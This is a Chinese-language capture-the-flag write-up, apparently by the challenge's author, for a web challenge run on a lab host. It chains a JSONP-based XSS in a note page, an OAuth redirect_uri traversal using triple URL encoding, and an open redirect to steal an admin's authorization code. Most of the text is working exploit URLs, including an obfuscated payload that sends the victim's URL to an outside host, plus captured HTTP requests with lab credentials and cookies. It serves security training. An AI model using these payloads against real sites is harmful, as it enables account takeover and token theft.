## writeup

### 前言

此题目是去年的赛题 blog 的升级版本，去年就出好了，准备和blog一起放出来的，但是奈何比赛时间太短了，没有机会放。

### 解题的思路

题目中的cookie是 `httpOnly` 的，所以无法用xss读到cookie，所以最终的想法就是利用xss来盗取管理员的 `auth` 的 `token`。下面是解题步骤。

#### 利用实体编码实现标签插入

很显然的是 `main/showNote?id=` `id` 参数存在 xss 。

```
http://192.168.15.166:80/main/showNote?id=<iframe/srcdoc=<script/src=http&#58;//192.168.15.166&#58;80/main/jsonp&#63;id=1&callback=alert`1`//&#62;&#60;/script&#62;></script>`
```

在页面中插入iframe标签，利用jsonp来实现xss。

**直接插入`<script>`标签是不行的，因为 jquery 的 `html()` 函数能够执行`<script>`标签是依赖于`eval`函数的，但是这里禁止了`eval`**


#### 盗取token的payload

```
top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`www.baidu.com`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`
```

因为callback参数过滤了 `=`，导致写 `xss payload` 很不方便，所以要在 id 参数的位置实现 xss ， 到 `<!--` 做注释 , payload 如下：

```
http://192.168.15.166:80/main/showNote?id=<iframe/srcdoc=<script/src=http&#58;//192.168.15.166&#58;80/main/jsonp&#63;id=`;top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`www.baidu.com`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`&#60;!--;&callback=`//&#62;&#60;/script&#62;></script>
```

部分关键字符进行url编码之后如下:

```
http://192.168.15.166:80/main/showNote?id=<iframe/srcdoc=<script/src=http%26%2358;//192.168.15.166%26%2358;80/main/jsonp%26%2363;id=`;top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`www.baidu.com`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`%26%2360;!--;%26callback=`//%26%2362;%26%2360;/script%26%2362;></script>
```

### 利用redirect url 进行跳转

认证的url如下：

```
http://192.168.15.166:8080/oauth?client_id=3f66bf84f42fec8fd6348593ab74db04&redirect_uri=http%3A%2f%2f192.168.15.166:80%2fmain%2foauth%2f&scope=user&response_type=code
```

可以进行三次url编码，实现目录跳脱:

```request
POST /oauth?client_id=3f66bf84f42fec8fd6348593ab74db04&redirect_uri=http%3A%2f%2f192.168.15.166:80%2fmain%2foauth%2f%25252e%25252e%25252f&scope=user&response_type=code HTTP/1.1
Host: 192.168.15.166:8080
Content-Length: 137
Cache-Control: max-age=0
Origin: http://192.168.15.166:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Referer: http://192.168.15.166:8080/oauth?client_id=3f66bf84f42fec8fd6348593ab74db04&redirect_uri=http%3A%2f%2f192.168.15.166:80%2fmain%2foauth%2f&scope=user&response_type=code
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,pl;q=0.6,zh-TW;q=0.5,pt;q=0.4,de;q=0.3
Cookie: PHPSESSID=fe97jmutasjbkmpeenmbhbiie2; session=eyJjc3JmX3Rva2VuIjp7IiBiIjoiWlRrME5qVXpOMk5qTXpJNU1HVmhZemd6T0RNeVpUZG1aRGMzTnprMk56SXpOR0poT1dZME9RPT0ifX0.XVPGnA.wQUqYQ9puNwZkrE2fnnUNbiMDpo
Connection: close

csrf_token=1565775020%23%239dc5a37cc6df8391d2c2da467c06779fae68fd27&email=729173164%40qq.com&password=123456&submit=%E6%8E%88+++%E6%9D%83
```

```response
HTTP/1.1 302 FOUND
Content-Type: text/html; charset=utf-8
Content-Length: 439
Location: http://192.168.15.166:80/main/oauth/%2e%2e%2f/?state=kEuazgXHGr&code=oCab4enXktGo1F9KdAAl9EIO7bctEZDPaE0XCGbW
Set-Cookie: session=eyJjc3JmX3Rva2VuIjp7IiBiIjoiWlRrME5qVXpOMk5qTXpJNU1HVmhZemd6T0RNeVpUZG1aRGMzTnprMk56SXpOR0poT1dZME9RPT0ifX0.XVPK9A.x2HhryO7bP2qSf-DRpMpXCIkB8w; HttpOnly; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="http://192.168.15.166:80/main/oauth/%2e%2e%2f/?state=kEuazgXHGr&amp;code=oCab4enXktGo1F9KdAAl9EIO7bctEZDPaE0XCGbW">http://192.168.15.166:80/main/oauth/%2e%2e%2f/?state=kEuazgXHGr&amp;code=oCab4enXktGo1F9KdAAl9EIO7bctEZDPaE0XCGbW</a>.  If not click the link.
```

由于nginx具有一次url解码能力，所以

```
http://192.168.15.166:80/main/oauth/%2e%2e%2f/?state=kEuazgXHGr&code=oCab4enXktGo1F9KdAAl9EIO7bctEZDPaE0XCGbW 
```

最后访问的地址是：

```
http://192.168.15.166:80/main//?state=kEuazgXHGr&code=oCab4enXktGo1F9KdAAl9EIO7bctEZDPaE0XCGbW 
```

通过伪造让redirect_url 跳转到下面地址实现xss

```
http://192.168.15.166:80/main/showNote?id=<iframe/srcdoc=<script/src=http%26%2358;//192.168.15.166%26%2358;80/main/jsonp%26%2363;id=`;top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`www.baidu.com`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`%26%2360;!--;%26callback=`//%26%2362;%26%2360;/script%26%2362;></script>
```

构造payload如下:

```
http://192.168.15.166:8080/oauth?client_id=3f66bf84f42fec8fd6348593ab74db04&redirect_uri=http%3A%2f%2f192.168.15.166:80%2fmain%2foauth%2f%25252e%25252e%25252fshowNote%253fid=<iframe/srcdoc=<script/src=http%252526%25252358;//192.168.15.166%252526%25252358;80/main/jsonp%252526%25252363;id=`;top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`www.baidu.com`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`%252526%25252360;!--;%252526callback=`//%252526%25252362;%252526%25252360;/script%252526%25252362;></script>&scope=user&response_type=code
```


需要在末尾添加 & 来截断 id的值 

```
http://192.168.15.166:8080/oauth?client_id=3f66bf84f42fec8fd6348593ab74db04&redirect_uri=http%3A%2f%2f192.168.15.166:80%2fmain%2foauth%2f%25252e%25252e%25252fshowNote%253fid=<iframe/srcdoc=<script/src=http%252526%25252358;//192.168.15.166%252526%25252358;80/main/jsonp%252526%25252363;id=`;top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`www.baidu.com`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`%252526%25252360;!--;%252526callback=`//%252526%25252362;%252526%25252360;/script%252526%25252362;></script>%2526&scope=user&response_type=code
```


跳转之后的地址是:

```
http://192.168.15.166:80/main/oauth/%2e%2e%2fshowNote/?id=<iframe/srcdoc=<script/src=http%26%2358;//192.168.15.166%26%2358;80/main/jsonp%26%2363;id=`;top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`www.baidu.com`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`%26%2360;!--;%26callback=`//%26%2362;%26%2360;/script%26%2362;></script>&?state=P3yuPEgZVd&code=MFuBj6EKwFlaiZT63GRY46ZXnywnF0Or0IY8DaGV
```

这样来实现盗取token。

### 将url发给管理员 

这里需要用到漏洞开放式url跳转漏洞，如果你去年做过这个题目，肯定记得。

```
http://192.168.15.166:80/main/login?next=http://192.168.15.166:8080/oauth%3Fclient_id=3f66bf84f42fec8fd6348593ab74db04%26redirect_uri=http%253A%252f%252f192.168.15.166:80%252fmain%252foauth%252f%2525252e%2525252e%2525252fshowNote%25253fid=<iframe/srcdoc=<script/src=http%25252526%2525252358;//192.168.15.166%25252526%2525252358;80/main/jsonp%25252526%2525252363;id=`;top.location=`${Array.call`${`http`}${atob`Og`}${atob`Lw`}${atob`Lw`}${`wonderkun.cc`}${atob`Lw`}${atob`Pw`}${escape.call`${top.location.href}`}`.join``}`%25252526%2525252360;!--;%25252526callback=`//%25252526%2525252362;%25252526%2525252360;/script%25252526%2525252362;></script>%252526%26scope=user%26response_type=code
```

然后就能打到管理员的code，然后访问一下，伪装成管理员身份，flag在cookie里面。

http://192.168.15.166:80/main/oauth/?state=5od9CV1yvW&code=o9uGSQjzJgtJ1OaROVsp3D1G84bWBhPkyUqal492

